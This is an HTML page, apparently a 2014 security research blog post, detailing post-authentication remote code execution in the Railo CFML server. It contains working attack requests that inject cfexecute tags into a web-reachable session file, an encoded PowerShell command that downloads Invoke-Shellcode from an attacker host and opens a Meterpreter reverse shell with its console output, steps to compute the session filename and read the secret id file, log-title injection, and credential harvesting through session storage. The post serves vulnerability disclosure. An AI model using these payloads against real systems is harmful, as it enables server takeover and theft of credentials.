@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>railo security - part two - post-authentication rce</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>railo security - part two - post-authentication rce</h1>
+			<b><time>2014-07-24</time></b>
+		       
+
+			<div>
+				<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one - intro</a></em><br>
+<em>Part two - post-authentication rce</em><br>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three - pre-authentication lfi</a></em><br>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four - pre-authentication rce</a></em></p>
+<p>This post continues our dive into Railo security, this time introducing several post-authentication RCE vulnerabilities discovered in the platform.  As stated in part one of this series, like ColdFusion, there is a task scheduler that allows authenticated users the ability to write local files.  Whilst the existence of this feature sets it as the standard way to shell a Railo box, sometimes this may not work.  For example, in the event of stringent firewall rules, or irregular file permissions, or you&rsquo;d just prefer not to make remote connections, the techniques explored in this post will aid you in this manner.</p>
+<p>PHP has an interesting, ahem, <em>feature</em>, where it writes out session information to a temporary file located in a designated path (<a href="http://ar.php.net/manual/en/session.configuration.php">more</a>).  If accessible to an attacker, this file can be used to inject PHP data into, via multiple different vectors such as a User-Agent or some function of the application itself.  Railo does sort of the same thing for its Web and Server interfaces, except these files are always stored in a predictable location.  Unlike PHP however, the name of the file is not simply the session ID, but is rather a quasi-unique value generated using a mixture of pseudo-random and predictable/leaked information.  I&rsquo;ll dive into this here in a bit.</p>
+<p>When a change to the interface is made, or a new page bookmark is created, Railo writes this information out to a session file located at <code>/admin/userdata/</code>.  The file is then either created, or an existing one is used, and will be named either <code>web-[value].cfm</code> or <code>server-[value].cfm</code> depending on the interface you&rsquo;re coming in from.  It&rsquo;s important to note the extension on these files; because of the CFM extension, these files will be parsed by the CFML interpreter looking for CF tags, much like PHP will do.  A typical request to add a new bookmark is as follows:</p>
+<pre tabindex="0"><code>GET /railo-context/admin/web.cfm?action=internal.savedata&amp;action2=addfavorite&amp;favorite=server.request HTTP/1.1
+</code></pre><p>The favorite <code>server.request</code> is then written out to a JSON-encoded array object in the session file, as below:</p>
+<pre tabindex="0"><code>{&#39;fullscreen&#39;:&#39;true&#39;,&#39;contentwidth&#39;:&#39;1267&#39;,&#39;favorites&#39;:{&#39;server.request&#39;:&#39;&#39;}}
+</code></pre><p>The next question is then obvious: what if we inject something malicious as a favorite?</p>
+<pre tabindex="0"><code>GET /railo-context/admin/web.cfm?action=internal.savedata&amp;action2=addfavorite&amp;favorite=&lt;cfoutput&gt;&lt;cfexecute name=&#34;c:\windows\system32\cmd.exe&#34; arguments=&#34;/c dir&#34; timeout=&#34;10&#34; variable=&#34;output&#34;&gt;&lt;/cfexecute&gt;&lt;pre&gt;#output#&lt;/pre&gt;&lt;/cfoutput&gt; HTTP/1.1
+</code></pre><p>Our session file will then read:</p>
+<pre tabindex="0"><code>{&#39;fullscreen&#39;:&#39;true&#39;,&#39;contentwidth&#39;:&#39;1267&#39;,&#39;favorites&#39;:{&#39;&lt;cfoutput&gt;&lt;cfexecute name=&#34;c:\windows\system32\cmd.exe&#34; arguments=&#34;/c dir&#34; timeout=&#34;10&#34; variable=&#34;output&#34;&gt;&lt;/cfexecute&gt;&lt;pre&gt;##output##&lt;/pre&gt;&lt;/cfoutput&gt;&#39;:&#39;&#39;,&#39;server.charset&#39;:&#39;&#39;}}
+</code></pre><p>Whilst our injected data is written to the file, astute readers will note the double # around our Coldfusion variable.  This is ColdFusion&rsquo;s way of escaping a number sign, and will therefore not reflect our command output back into the page.  To my knowledge, there is no way to obtain shell output without the use of the variable tags.</p>
+<p>We have two options for popping this: inject a command to return a shell or inject a web shell that simply writes output to a file that is then accessible from the web root.  I&rsquo;ll start with the easiest of the two, which is injecting a command to return a shell.</p>
+<p>I&rsquo;ll use PowerSploit&rsquo;s Invoke-Shellcode script and inject a Meterpreter shell into the Railo process.  Because Railo will also quote our single/double quotes, we need to base64 the Invoke-Expression payload:</p>
+<pre tabindex="0"><code>GET /railo-context/admin/web.cfm?action=internal.savedata&amp;action2=addfavorite&amp;favorite=%3A%3Ccfoutput%3E%3Ccfexecute%20name%3D%22c%3A%5Cwindows%5Csystem32%5Ccmd.exe%22%20arguments%3D%22%2Fc%20PowerShell.exe%20-Exec%20ByPass%20-Nol%20-Enc%20aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA2ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQAnACkA%22%20timeout%3D%2210%22%20variable%3D%22output%22%3E%3C%2Fcfexecute%3E%3C%2Fcfoutput%3E%27 HTTP/1.1
+</code></pre><p>Once injected, we hit our session page and pop a shell:</p>
+<pre tabindex="0"><code>payload =&gt; windows/meterpreter/reverse_https
+LHOST =&gt; 192.168.1.6
+LPORT =&gt; 4444
+[*] Started HTTPS reverse handler on https://0.0.0.0:4444/
+[*] Starting the payload handler...
+[*] 192.168.1.102:50122 Request received for /INITM...
+[*] 192.168.1.102:50122 Staging connection for target /INITM received...
+[*] Patched user-agent at offset 663128...
+[*] Patched transport at offset 662792...
+[*] Patched URL at offset 662856...
+[*] Patched Expiration Timeout at offset 663728...
+[*] Patched Communication Timeout at offset 663732...
+[*] Meterpreter session 1 opened (192.168.1.6:4444 -&gt; 192.168.1.102:50122) at 2014-03-24 00:44:20 -0600
+
+meterpreter &gt; getpid
+Current pid: 5064
+meterpreter &gt; getuid
+Server username: bryan-PC\bryan
+meterpreter &gt; sysinfo
+Computer        : BRYAN-PC
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x64 (Current Process is WOW64)
+System Language : en_US
+Meterpreter     : x86/win32
+meterpreter &gt; 
+</code></pre><p>Because I&rsquo;m using Powershell, this method won&rsquo;t work in Windows XP or Linux systems, but it&rsquo;s trivial to use the next method for that (net user/useradd).</p>
+<p>The second method is to simply write out the result of a command into a file and then retrieve it.  This can trivially be done with the following:</p>
+<pre tabindex="0"><code>&#39;:&lt;cfoutput&gt;&lt;cfexecute name=&#34;c:\windows\system32\cmd.exe&#34; arguments=&#34;/c dir &gt; ./webapps/www/WEB-INF/railo/context/output.cfm&#34; timeout=&#34;10&#34; variable=&#34;output&#34;&gt;&lt;/cfexecute&gt;&lt;/cfoutput&gt;&#39;
+</code></pre><p>Note that we&rsquo;re writing out to the start of web root and that our output file is a CFM; this is a requirement as the web server won&rsquo;t serve up flat files or txt&rsquo;s.</p>
+<p>Great, we&rsquo;ve verfied this works.  Now, how to actually figure out what the hell this session file is called?  As previously noted, the file is saved as either <code>web-[VALUE].cfm</code> or <code>server-[VALUE].cfm</code>, the prefix coming from the interface you&rsquo;re accessing it from.  I&rsquo;m going to step through the code used for this, which happens to be a healthy mix of CFML and Java.</p>
+<p>We&rsquo;ll start by identifying the session file on my local Windows XP machine: <code>web-a898c2525c001da402234da94f336d55.cfm</code>.  This is stored in <code>www\WEB-INF\railo\context\admin\userdata</code>, of which <code>admin\userdata</code> is accessible from the web root, that is, we can directly access this file by hitting <code>railo-context/admin/userdata/[file]</code> from the browser.</p>
+<p>When a favorite it saved, <code>internal.savedata.cfm</code> is invoked and searches through the given list for the function we&rsquo;re performing:</p>
+<pre tabindex="0"><code>&lt;cfif listFind(&#34;addfavorite,removefavorite&#34;, url.action2) and structKeyExists(url, &#34;favorite&#34;)&gt;
+    &lt;cfset application.adminfunctions[url.action2](url.favorite) /&gt;
+        &lt;cflocation url=&#34;?action=#url.favorite#&#34; addtoken=&#34;no&#34; /&gt;
+</code></pre><p>This calls down into <code>application.adminfunctions</code> with the specified action and favorite-to-save.  Our addfavorite function is as follows:</p>
+<pre tabindex="0"><code>&lt;cffunction name=&#34;addfavorite&#34; returntype=&#34;void&#34; output=&#34;no&#34;&gt;
+        &lt;cfargument name=&#34;action&#34; type=&#34;string&#34; required=&#34;yes&#34; /&gt;
+        &lt;cfset var data = getfavorites() /&gt;
+        &lt;cfset data[arguments.action] = &#34;&#34; /&gt;
+        &lt;cfset setdata(&#39;favorites&#39;, data) /&gt;
+    &lt;/cffunction&gt;
+</code></pre><p>Tunneling yet deeper into the rabbit hole, we move forwards into setdata:</p>
+<pre tabindex="0"><code>&lt;cffunction name=&#34;setdata&#34; returntype=&#34;void&#34; output=&#34;no&#34;&gt;
+        &lt;cfargument name=&#34;key&#34; type=&#34;string&#34; required=&#34;yes&#34; /&gt;
+        &lt;cfargument name=&#34;value&#34; type=&#34;any&#34; required=&#34;yes&#34; /&gt;
+        &lt;cflock name=&#34;setdata_admin&#34; timeout=&#34;1&#34; throwontimeout=&#34;no&#34;&gt;
+            &lt;cfset var data = loadData() /&gt;
+            &lt;cfset data[arguments.key] = arguments.value /&gt;
+            &lt;cfset writeData() /&gt;
+        &lt;/cflock&gt;
+    &lt;/cffunction&gt;
+</code></pre><p>This function actually reads in our data file, inserts our new favorite into the data array, and writes it back down.  Our question is &ldquo;how do you know the file?&rdquo;, so naturally we need to head into loadData:</p>
+<pre tabindex="0"><code> &lt;cffunction name=&#34;loadData&#34; access=&#34;private&#34; output=&#34;no&#34; returntype=&#34;any&#34;&gt;
+        &lt;cfset var dataKey = getDataStoreName() /&gt;
+            [..snip..]
+</code></pre><p>And yet deeper we move, into getDataStoreName:</p>
+<pre tabindex="0"><code>&lt;cffunction name=&#34;getDataStoreName&#34; access=&#34;private&#34; output=&#34;no&#34; returntype=&#34;string&#34;&gt;
+        &lt;cfreturn &#34;#request.admintype#-#getrailoid()[request.admintype].id#&#34; /&gt;
+    &lt;/cffunction&gt;
+</code></pre><p>At last we&rsquo;ve reached the apparent event horizon of this XML black hole; we see the return will be of form <code>web-#getrailoid()[web].id#</code>, substituting in web for request.admintype.</p>
+<p>I&rsquo;ll skip some of the digging here, but lets fast forward to Admin.java:</p>
+<pre tabindex="0"><code> private String getCallerId() throws IOException {
+        if(type==TYPE_WEB) {
+            return config.getId();
+        }
+</code></pre><p>Here we return the ID of the caller (our ID, for reference, is what we&rsquo;re currently tracking down!), which calls down into config.getId:</p>
+<pre tabindex="0"><code>   @Override
+    public String getId() {
+        if(id==null){
+            id = getId(getSecurityKey(),getSecurityToken(),false,securityKey);
+        }
+        return id;
+    }
+</code></pre><p>Here we invoke getId which, if null, calls down into an overloaded getId which takes a security key and a security token, along with a boolean (false) and some global securityKey value.  Here&rsquo;s the function in its entirety:</p>
+<pre tabindex="0"><code>    public static String getId(String key, String token,boolean addMacAddress,String defaultValue) {
+
+        try {
+            if(addMacAddress){// because this was new we could swutch to a new ecryption // FUTURE cold we get rid of the old one?
+                return Hash.sha256(key+&#34;;&#34;+token+&#34;:&#34;+SystemUtil.getMacAddress());
+            }
+            return Md5.getDigestAsString(key+token);
+        }
+        catch (Throwable t) {
+            return defaultValue;
+        }
+    }
+</code></pre><p>Our ID generation is becoming clear; it&rsquo;s essentially the MD5 of key + token, the key being returned from <code>getSecurityKey</code> and the token coming from <code>getSecurityToken</code>.  These functions are simply getters for private global variables in the ConfigImpl class, but tracking down their generation is fairly trivial.  All state initialization takes place in ConfigWebFactory.java.  Let&rsquo;s first check out the security key:</p>
+<pre tabindex="0"><code>private static void loadId(ConfigImpl config) {
+        Resource res = config.getConfigDir().getRealResource(&#34;id&#34;);
+        String securityKey = null;
+        try {
+            if (!res.exists()) {
+                res.createNewFile();
+                IOUtil.write(res, securityKey = UUIDGenerator.getInstance().generateRandomBasedUUID().toString(), SystemUtil.getCharset(), false);
+            }
+            else {
+                securityKey = IOUtil.toString(res, SystemUtil.getCharset());
+            }
+        }
+</code></pre><p>Okay, so our key is a randomly generated UUID from the safehaus library.  This isn&rsquo;t very likely to be guessed/brute-forced, but the value is written to a file in a consistent place.  We&rsquo;ll return to this.</p>
+<p>The second value we need to calculate is the security token, which is set in ConfigImpl:</p>
+<pre tabindex="0"><code>public String getSecurityToken() {
+        if(securityToken==null){
+            try {
+                securityToken = Md5.getDigestAsString(getConfigDir().getAbsolutePath());
+            }
+            catch (IOException e) {
+                return null;
+            }
+        }
+        return securityToken;
+    }
+</code></pre><p>Gah!  This is predictable/leaked!  The token is simply the MD5 of our configuration directory, which in my case is <code>C:\Documents and Settings\bryan\My Documents\Downloads\railo-express-4.0.4.001-jre-win32\webapps\www\WEB-INF\railo</code>  So let&rsquo;s see if this works.</p>
+<p>We MD5 the directory (<code>20132193c7031326cab946ef86be8c74</code>), then prefix this with the random UUID (securityKey) to finally get:</p>
+<pre tabindex="0"><code>$ echo -n &#34;3ec59952-b5de-4502-b9d7-e680e5e2071820132193c7031326cab946ef86be8c74&#34; | md5sum
+a898c2525c001da402234da94f336d55  -
+</code></pre><p>Ah-ha!  Our session file will then be web-a898c2525c001da402234da94f336d55.cfm, which exactly lines up with what we&rsquo;re seeing:</p>
+<figure><img src="/images/posts/2014/railo/railo_session_proof.jpg"/>
+</figure>
+
+<p>I mentioned that the config directory is leaked; default Railo is pretty promiscuous:</p>
+<figure><img src="/images/posts/2014/railo/railo_bad_page.jpg"/>
+</figure>
+
+<p>As you can see, from this we can derive the base configuration directory and figure out one half of the session filename.  We now turn our attention to figuring out exactly what the securityKey is; if we recall, this is a randomly generated UUID that is then written out to a file called <code>id</code>.</p>
+<p>There are two options here; one, guess or predict it, or two, pull the file with an LFI.  As alluded to in part one, we can set the error handler to any file on the system we want.  As we&rsquo;re in the mood to discuss post-authentication issues, we can harness this to fetch the required <code>id</code> file containing this UUID:</p>
+<figure><img src="/images/posts/2014/railo/railo-error-handler-lfi.jpg"/>
+</figure>
+
+<p>When we then access a non-existant page, we trigger the template and the system returns our file:</p>
+<figure><img src="/images/posts/2014/railo/railo-uuid.jpg"/>
+</figure>
+
+<p>By combining these specific vectors and inherit weaknesses in the Railo architecture, we can obtain post-authentication RCE without forcing the server to connect back.  This can be particularly useful when the Task Scheduler just isn&rsquo;t an option.  This vulnerability has been implemented into clusterd as an auxiliary module, and is available in the latest dev build (0.3.1).  A quick example of this:</p>
+<figure><img src="/images/posts/2014/railo/railo-log-injection-exec.jpg"/>
+</figure>
+
+<p>I mentioned briefly at the start of this post that there were &ldquo;several&rdquo; post-authentication RCE vulnerabilities.  Yes.  Several.  The one documented above was fun to find and figure out, but there is another way that&rsquo;s much cleaner.  Railo has a function that allows administrators to set logging information, such as level and type and location.  It also allows you to create your own logging handlers:</p>
+<figure><img src="/images/posts/2014/railo/railo-log-settings.jpg"/>
+</figure>
+
+<p>Here we&rsquo;re building an HTML layout log file that will append all ERROR logs to the file.  And we notice we can configure the path and the title.  And the log extension.  Easy win.  By modifying the path to <code>/context/my_file.cfm</code> and setting the title to <code>&lt;cfdump var=&quot;#session#&quot;&gt;</code> we can execute arbitrary commands on the file system and obtain shell access.  The file is not created once you create the log, but once you select Edit and then Submit for some reason.  Here&rsquo;s the HTML output that&rsquo;s, by default, stuck into the file:</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;http://www.w3.org/TR/html4/loose.dtd&#34;&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;&lt;cfdump var=&#34;#session#&#34;&gt;&lt;/title&gt;
+&lt;style type=&#34;text/css&#34;&gt;
+&lt;!--
+body, table {font-family: arial,sans-serif; font-size: x-small;}
+th {background: #336699; color: #FFFFFF; text-align: left;}
+--&gt;
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body bgcolor=&#34;#FFFFFF&#34; topmargin=&#34;6&#34; leftmargin=&#34;6&#34;&gt;
+&lt;hr size=&#34;1&#34; noshade&gt;
+Log session start time Mon Jun 30 23:06:17 MDT 2014&lt;br&gt;
+&lt;br&gt;
+&lt;table cellspacing=&#34;0&#34; cellpadding=&#34;4&#34; border=&#34;1&#34; bordercolor=&#34;#224466&#34; width=&#34;100%&#34;&gt;
+&lt;tr&gt;
+&lt;th&gt;Time&lt;/th&gt;
+&lt;th&gt;Thread&lt;/th&gt;
+&lt;th&gt;Level&lt;/th&gt;
+&lt;th&gt;Category&lt;/th&gt;
+&lt;th&gt;Message&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;br&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre><p>Note our title contains the injected command.  Here&rsquo;s execution:</p>
+<figure><img src="/images/posts/2014/railo/railo-log-inject-execution.jpg"/>
+</figure>
+
+<p>Using this method we can, again, inject a shell without requiring the use of any reverse connections, though that option is of course available with the help of the <code>cfhttp</code> tag.</p>
+<p>Another fun post-authentication <em>feature</em> is the use of data sources.  In Railo, you can craft a custom data source, which is a user-defined database abstraction that can be used as a filesystem.  Here&rsquo;s the definition of a MySQL data source:</p>
+<figure><img src="/images/posts/2014/railo/railo-datasource-def.jpg"/>
+</figure>
+
+<p>With this defined, we can set all client session data to be stored in the database, allowing us to harvest session ID&rsquo;s and plaintext credentials (see part one).  Once the session storage is set to the created database, a new table will be created (cf_session_data) that will contain all relevant session information, including symmetrically-encrypted passwords.</p>
+<figure><img src="/images/posts/2014/railo/railo-database-session-info.jpg"/>
+</figure>
+
+<p>Part three and four of this series will begin to dive into the good stuff, where we&rsquo;ll discuss several pre-authentication vulnerabilities that we can use to obtain credentials and remote code execution on a Railo host.</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
